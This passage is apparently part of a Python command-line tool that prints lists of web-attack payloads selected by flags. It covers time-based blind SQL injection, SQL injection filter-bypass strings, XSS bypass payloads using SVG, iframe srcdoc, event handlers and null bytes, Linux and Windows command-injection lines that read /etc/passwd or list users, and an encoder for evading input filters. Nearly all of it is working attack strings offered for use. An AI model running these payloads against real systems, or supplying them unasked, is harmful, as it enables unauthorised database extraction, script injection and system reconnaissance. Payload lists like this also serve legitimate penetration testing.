    "' AND IF((SELECT SUBSTRING(user(),1,1))='r',SLEEP(5),0)--",
    "' AND IF(1=1,BENCHMARK(1000000,MD5('A')),0)--",
    "' AND IF(1=2,BENCHMARK(1000000,MD5('A')),0)--",
    "' AND IF((SELECT LENGTH(user()))>5,SLEEP(5),0)--",
    "' AND IF((SELECT LENGTH(user()))<5,SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))=100,SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))=97,SLEEP(5),0)--",

    "' OR SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' || IF(1=1,SLEEP(5),0)--",
    "' && IF(1=1,SLEEP(5),0)--",
    "' AND IF((SELECT SUBSTRING((SELECT user()),1,1))='r',SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING((SELECT user()),1,1)))=114,SLEEP(5),0)--",
    "' AND IF((SELECT SUBSTRING(database(),1,1))='t',SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))>100,SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))<120,SLEEP(5),0)--",
    "' AND IF(1 BETWEEN 1 AND 1,SLEEP(5),0)--",

    "' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--",
    "' AND CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END--",
    "' AND IF(STRCMP('a','a')=0,SLEEP(5),0)--",
    "' AND IF(STRCMP('a','b')=0,SLEEP(5),0)--",
    "' AND IF(EXISTS(SELECT * FROM users),SLEEP(5),0)--",
    "' AND IF(NOT EXISTS(SELECT * FROM users),SLEEP(5),0)--",
    "' AND IF((SELECT COUNT(*) FROM users)>1,SLEEP(5),0)--",
    "' AND IF((SELECT LENGTH((SELECT user())))>1,SLEEP(5),0)--",
    "' AND IF((SELECT LENGTH((SELECT database())))>5,SLEEP(5),0)--",
    "' AND IF((SELECT LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1)))>5,SLEEP(5),0)--",

    "' AND IF((SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)))=97,SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns LIMIT 1),1,1)))=117,SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING((SELECT @@hostname),1,1)))=104,SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING((SELECT user()),1,1)))=114,SLEEP(5),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1)))=100,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1)) BETWEEN 97 AND 122,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING((SELECT user()),1,1)) BETWEEN 97 AND 122,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING((SELECT @@version),1,1)) BETWEEN 48 AND 57,SLEEP(5),0)--",
    "' AND IF((SELECT LENGTH((SELECT @@version)))>10,SLEEP(5),0)--",
    "' AND IF((SELECT LENGTH((SELECT @@datadir)))>10,SLEEP(5),0)--"
]

    for payloads in list_of_time_payloads:
        print(payloads)



def encoder():
    print("Options are: (--url / --base64 / --hex / --unicode)")
    user_input = input("Enter the payload to encode: ")

    if "--url" in user_input:
        payload = user_input.replace("--url", "").strip()
        url_encoding = urllib.parse.quote(payload)
        print("URL Encoded:", url_encoding)

    elif "--base64" in user_input:
        payload = user_input.replace("--base64", "").strip()
        base64_encoded = base64.b64encode(payload.encode()).decode()
        print("Base64 Encoded:", base64_encoded)

    elif "--hex" in user_input:
        payload = user_input.replace("--hex", "").strip()
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
        print("Hex Encoded:", hex_encoded)

    elif "--unicode" in user_input:
        payload = user_input.replace("--unicode", "").strip()
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
        print("Unicode Encoded:", unicode_encoded)

    else:
        print("Please specify encoding type: (--url / --base64 / --hex / --unicode)")



# Bypassing Techniques for XSS

def xss_bypas_tech_svg():
    list_of_bypas_tech_svg_payloads = [
    '<svg onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>',
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
    '<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>',
    '<svg><animate attributeName="x" begin="0s" dur="1s" from="0" to="100" onbegin="alert(1)"/></svg>',
    '<svg><set attributeName="x" to="100" begin="0s" onbegin="alert(1)"/></svg>',
    '<svg><circle onmouseover=alert(1) r="40"/></svg>',
    '<svg><image href="x" onerror=alert(1)/></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
    '<svg><script xlink:href="data:text/javascript,alert(1)"/></svg>',
    '<svg><use xlink:href="javascript:alert(1)"/></svg>',
    '<svg><metadata><script>alert(1)</script></metadata></svg>',
    '<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>',
    '<svg><g onload=alert(1)></g></svg>',
    '<svg><polygon onmouseover=alert(1) points="200,10 250,190 160,210"/></svg>',
    '<svg><rect width="100" height="100" fill="red" onclick="alert(1)"/></svg>',
    '<svg><text onclick="alert(1)">Click me</text></svg>',
    '<svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>',
    '<svg><image xlink:href="x" onerror="alert(1)" /></svg>',
    '<svg><path id="a" onload="alert(1)"></path></svg>',
    '<svg><animateMotion path="M0,0 L100,100" onbegin="alert(1)"/></svg>',
    '<svg><filter id="f" filterUnits="userSpaceOnUse"><feImage xlink:href="x" onerror="alert(1)"/></filter></svg>',
    '<svg><pattern id="p" patternUnits="userSpaceOnUse"><image xlink:href="x" onerror="alert(1)"/></pattern></svg>',
    '<svg><marker id="m" onload="alert(1)"/></svg>'
]

    for payloads in list_of_bypas_tech_svg_payloads:
        print(payloads)


def xss_bypas_tech_srcdoc():
    list_of_bypas_tech_srcdoc_payloads =[
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    "<iframe srcdoc='<img src=x onerror=alert(1)>'></iframe>",
    '<iframe srcdoc="<svg onload=alert(1)>"></iframe>',
    "<iframe srcdoc='<body onload=alert(1)>'></iframe>",
    '<iframe srcdoc="<video><source onerror=alert(1)></video>"></iframe>',
    "<iframe srcdoc='<input autofocus onfocus=alert(1)>'></iframe>",
    '<iframe srcdoc="<marquee onstart=alert(1)>test</marquee>"></iframe>',
    '<iframe srcdoc="<details open ontoggle=alert(1)>X</details>"></iframe>',
    '<iframe srcdoc="<a href=\'javascript:alert(1)\'>Click</a>"></iframe>',
    '<iframe srcdoc="<math href=\'javascript:alert(1)\'>"></iframe>',
    '<iframe srcdoc="<iframe srcdoc=\'<script>alert(1)</script>\'>"></iframe>',
    '<iframe srcdoc="<script>eval(\'al\'+\'ert(1)\')</script>"></iframe>',
    '<iframe srcdoc="<script>setTimeout(alert,0,1)</script>"></iframe>',
    '<iframe srcdoc="<script>Function(\'alert(1)\')()</script>"></iframe>',
    '<iframe srcdoc="<object data=\'javascript:alert(1)\'></object>"></iframe>',
    '<iframe srcdoc="<img src onerror=\'alert(1)\'>"></iframe>',
    '<iframe srcdoc="<embed src=\'data:text/html,<script>alert(1)</script>\'>"></iframe>',
    '<iframe srcdoc="<iframe srcdoc=\'<img src=x onerror=alert(1)>\'>"></iframe>',
    '<iframe srcdoc=\'<svg><animate attributeName="x" onbegin="alert(1)"/></svg>\'></iframe>',
    '<iframe srcdoc="<table background=\'javascript:alert(1)\'>"></iframe>',
    '<iframe srcdoc="<script src=\'data:text/javascript,alert(1)\'></script>"></iframe>',
    '<iframe srcdoc="<meta http-equiv=\'refresh\' content=\'0;url=javascript:alert(1)\'>"></iframe>',
    '<iframe srcdoc="<body><svg><script>alert(1)</script></svg></body>"></iframe>',
    "<iframe srcdoc='<div onpointerenter=alert(1)>Hover</div>'></iframe>",
    '<iframe srcdoc="<form onsubmit=alert(1)><input type=submit></form>"></iframe>'
]

    for payloads in list_of_bypas_tech_srcdoc_payloads:
        print(payloads)


def xss_bypas_tech_event_handler():
    list_of_bypas_tech_event_handler_payloads = [
    '<img src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
    '<div onclick=alert(1)>Click Me</div>',
    '<svg onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<a href="#" onmouseover=alert(1)>Hover Me</a>',
    '<form onsubmit=alert(1)><input type=submit></form>',
    '<textarea oninput=alert(1)>Type here</textarea>',
    '<marquee onstart=alert(1)>Scroll</marquee>',
    '<details open ontoggle=alert(1)>Details</details>',
    '<video onplay=alert(1) autoplay>',
    '<object data=x onerror=alert(1)>',
    '<iframe onload=alert(1) srcdoc="">',
    '<button onmousedown=alert(1)>Press</button>',
    '<img src=x onmouseover=alert(1)>',
    '<div onmouseenter=alert(1)>Enter me</div>',
    '<embed src=x onerror=alert(1)>',
    '<table background=x onerror=alert(1)>',
    '<input onmouseover=alert(1) value="Hover">',
    '<input onkeydown=alert(1) autofocus>',
    '<audio onloadeddata=alert(1) src=x>',
    '<select onfocus=alert(1) autofocus><option>Hi</option></select>',
    '<canvas onmouseenter=alert(1)>X</canvas>',
    '<div style="animation-name:x" onanimationstart=alert(1)></div>',
    '<math onmouseover=alert(1)>X</math>'
]

    for payloads in list_of_bypas_tech_event_handler_payloads:
        print(payloads)


def xss_bypas_tech_null_byte():
    list_of_bypas_tech_null_bytes_payloads =  [
    '<script%00>alert(1)</script>',
    '<img src=x%00 onerror=alert(1)>',
    '<svg onload=alert(1)%00>',
    '<a href="javascript:alert(1)%00">Click</a>',
    '<iframe srcdoc="<script%00>alert(1)</script>"></iframe>',
    '<div style="background:url(\'x\'%00)" onerror=alert(1)>',
    '<math><mtext%00><script>alert(1)</script></math>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%00"></object>',
    '<form action="/submit%00" onsubmit=alert(1)>',
    '<input value="test%00" onclick=alert(1)>',
    '<img src="data:image/svg+xml,%00<svg onload=alert(1)">',
    '<embed src=x%00 onerror=alert(1)>',
    '<marquee onstart=alert(1)%00>Text</marquee>',
    '<link rel="stylesheet%00" onload=alert(1)>',
    '<style>@import\'javascript:alert(1)%00\';</style>',
    '<input type="text%00" onfocus=alert(1)>',
    '<iframe srcdoc="<body onload=alert(1)%00>"></iframe>',
    '<svg><a xlink:href="javascript:alert(1)%00">click</a></svg>',
    '<img src="x%00.jpg" onerror=alert(1)>',
    '<div><script%00>alert(1)</script></div>',
    '<video src="x%00" onerror=alert(1)>',
    '<details open ontoggle=alert(1)%00>Click</details>',
    '<button type="submit%00" onclick=alert(1)>OK</button>',
    '<audio src="x%00" onerror=alert(1)>',
    '<textarea autofocus onfocus=alert(1)%00>Hi</textarea>'
]

    for payloads in list_of_bypas_tech_null_bytes_payloads:
        print(payloads)




def sqli_bypas_comments():
    list_of_bypas_comments_payloads = [
    "'/**/OR/**/1=1--",
    "'/**/OR/**/'a'='a--",
    "'/**/UNION/**/SELECT/**/NULL--",
    "'/**/UNION/**/SELECT/**/1,2,3--",
    "'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",
    "'/**/OR/**/1/**/=/**/1--",
    "' AND/**/1=1--",
    "' AND/**/'x'='x--",
    "'/**/UNION/**/SELECT/**/version()--",
    "'/**/UNION/**/SELECT/**/user(),database()--",
    "'/**/OR/**/sleep(5)--",
    "' OR/**/1=1/**/LIMIT/**/1--",
    "'/**/ORDER/**/BY/**/1--",
    "'/**/GROUP/**/BY/**/1--",
    "' OR/**/1=1/**/#",
    "' OR/**/1=1/**;--",
    "'/**/OR/**/ascii(substr(database(),1,1))>64--",
    "'/**/OR/**/1=1/**/AND/**/1=1--",
    "'/**/AND/**/EXISTS(SELECT/**/1)--",
    "'/**/AND/**/(SELECT/**/1/**/FROM/**/DUAL)/**/=/**/1--",
    "' UNION/**/SELECT/**/NULL,NULL,NULL--",
    "'/**/UNION/**/SELECT/**/1,2,'<script>alert(1)</script>'--",
    "'/**/AND/**/1=1/**/--",
    "'/**/AND/**/1=2/**/--",
    "'/*!50000UNION*//*!50000SELECT*/ 1,2,3--"
]
    for payloads in list_of_bypas_comments_payloads:
        print(payloads)

def sqli_bypas_case_variation():
    list_of_bypas_case_variation_payloads = [
    "' Or 1=1--",
    "' oR 'x'='x--",
    "' AnD 1=1--",
    "' aNd 'a'='a--",
    "' UnIon SeLeCt 1,2,3--",
    "' UNion SeLEct version()--",
    "' uNIoN sElEcT user(),database()--",
    "' UnIoN All SeLeCT 1,2,3--",
    "' UnIon sELeCt null,null,null--",
    "' OR 1=1 LIMIT 1--",
    "' oR 1=1 #",
    "' Or 'abc'='abc'--",
    "' UnION sELecT table_name FROM information_schema.tables--",
    "' aND 1=2--",
    "' OR 1=1 aND 1=1--",
    "' uNIoN SeLeCt 'abc','def','ghi'--",
    "' AnD ExIsTs(SeLeCt 1)--",
    "' oR ExIsTs(SeLeCt 1)--",
    "' uNIoN sELecT null,version(),null--",
    "' oR ascii(substr(database(),1,1))>64--",
    "' uNIoN sELecT 1,database(),user()--",
    "' UnIoN sELEct 1,2,3,4--",
    "' Or 1=1 order by 1--",
    "' Or 1=1 group by 1--",
    "' oR sleep(5)--"
]

    for payloads in list_of_bypas_case_variation_payloads:
        print(payloads)

def sqli_bypas_special_characters():
    list_of_bypas_special_characters_payloads = [
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1;%00",
    "' OR 1=1%23",
    "' OR%201=1--",
    "' OR+1=1--",
    "' OR%091=1--",
    "' OR%0A1=1--",
    "' OR 1=1--%0aSELECT+1",
    "'; SELECT version()--",
    "' OR(1=1)--",
    "' OR(SELECT 1)--",
    "' OR 1=1 LIMIT 1;--",
    "' OR '1'='1'--",
    '" OR "1"="1"--',
    "' OR 1=1/**/--",
    "' OR'1'='1'%23",
    "' OR 1=1%0A--",
    "' OR 1=1#%0ASELECT user()",
    "' OR (1=1)-- -",
    "' OR 1=1 AND 'a'='a'--",
    "' OR LENGTH(database())>0#",
    "' OR ascii(substr(user(),1,1))>64--",
    "' OR 1=1 UNION SELECT null,null--",
    "'; WAITFOR DELAY '0:0:5'--"
]

    for payloads in list_of_bypas_special_characters_payloads:
        print(payloads)



# command injection payloads linux
def linux_payloads():
    list_of_linux_payloads = [";ls",
    "&& ls",
    "| ls",
    ";whoami",
    "&& whoami",
    "| whoami",
    ";id",
    "&& id",
    "| id",
    ";uname -a",
    "&& uname -a",
    "| uname -a",
    ";cat /etc/passwd",
    "&& cat /etc/passwd",
    "| cat /etc/passwd",
    ";pwd",
    "&& pwd",
    "| pwd",
    ";echo hello",
    "&& echo hello",
    "| echo hello",
    ";netstat -an",
    ";ps aux",
    ";sleep 5"

]

    for payloads in list_of_linux_payloads:
        print(payloads)


# command injections payloads windows
def windows_payloads():
    list_of_windows_payloads = [ "& dir",
    "&& dir",
    "| dir",
    "& whoami",
    "&& whoami",
    "| whoami",
    "& echo hello",
    "&& echo hello",
    "| echo hello",
    "& net user",
    "&& net user",
    "| net user",
    "& hostname",
    "&& hostname",
    "| hostname",
    "& ipconfig",
    "&& ipconfig",
    "| ipconfig",
    "& tasklist",
    "& systeminfo",
    "& ping 127.0.0.1",
    "& timeout /t 5",
    "& set"

    ]

    for payloads in list_of_windows_payloads:
        print(payloads)


def bypasing_techniques():
    print("""Available Bypass Flags:

    --b --svg
    --b --srcdoc
    --b --eventHandler
    --b --nullByte
    --b --comments
    --b --caseVariation
    --b --specialCharacters
    """)


if "--xss" in sys.argv and "--reflected" in sys.argv:
    reflected_xss_payloads()

if "--xss" in sys.argv and "--stored" in sys.argv:
    stored_xss_payloads()

if "--xss" in sys.argv and "--dom" in sys.argv:
    dom_xss_payloads()


if "--sqli" in sys.argv and "--error" in sys.argv:
    error_sqli()



if "--sqli" in sys.argv and "--union" in sys.argv:
    union_sqli()


if "--sqli" in sys.argv and "--boolean" in sys.argv:
    Boolean_sqli()

if "--sqli" in sys.argv and "--time" in sys.argv:
    time_sqli()

# command injection payloads linux

if "--linux" in sys.argv:
    linux_payloads()


# command injection payloads windows
if "--windows" in sys.argv:
    windows_payloads()

#encoding

if "--encode" in sys.argv:
    encoder()



#bypassing

if "--b" in sys.argv and "--svg" in sys.argv :
    xss_bypas_tech_svg()


if "--b" in sys.argv and "--srcdoc" in sys.argv:
    xss_bypas_tech_srcdoc()

if "--b" in sys.argv and "--eventHandler" in sys.argv:
    xss_bypas_tech_event_handler()

if "--b" in sys.argv and "--nullByte" in sys.argv:
    xss_bypas_tech_null_byte()


if "--b" in sys.argv and "--comments" in sys.argv:
    sqli_bypas_comments()



if "--b" in sys.argv and "--caseVariation" in sys.argv:
    sqli_bypas_case_variation()


if "--b" in sys.argv and "--specialCharacters" in sys.argv:
    sqli_bypas_special_characters()

if "--bypassingTechniques" in sys.argv:
    bypasing_techniques()

#help
if "--h" in sys.argv:
    help()